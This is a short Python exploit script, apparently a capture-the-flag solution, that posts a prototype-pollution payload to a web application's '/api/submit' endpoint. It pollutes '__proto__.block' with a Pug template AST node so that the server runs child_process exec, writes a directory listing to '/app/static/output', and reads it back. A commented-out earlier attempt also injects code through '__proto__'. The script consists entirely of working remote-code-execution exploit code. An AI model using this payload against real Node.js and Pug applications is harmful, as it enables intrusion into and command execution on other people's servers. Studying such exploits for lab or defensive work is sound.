import requests

host = "http://188.166.174.107:30392"
# r = requests.post(host+"/api/submit", json={
#     "artist.name": "Haigh",
#     "__proto__": {
#         "return res.json({\'response\': pug.compile(\'test: penetrated\')({ user: \'guest\' })});": "test",
#         "console.log(\"penetrated\")": "test"}
#         })

r = requests.post(host + '/api/submit', json = {
    "artist.name":"Haigh",
    "__proto__.block": {
        "type": "Text", 
        "line": "const { exec } = require(\'child_process\'); exec(`ls > /app/static/output`);"
    },
    "loc": {
        "start": 0,
        "end": 0
    }
})
answer = r.text

print(answer+"\n")
print(r.raw)

print(requests.get(host+"/static/output").text)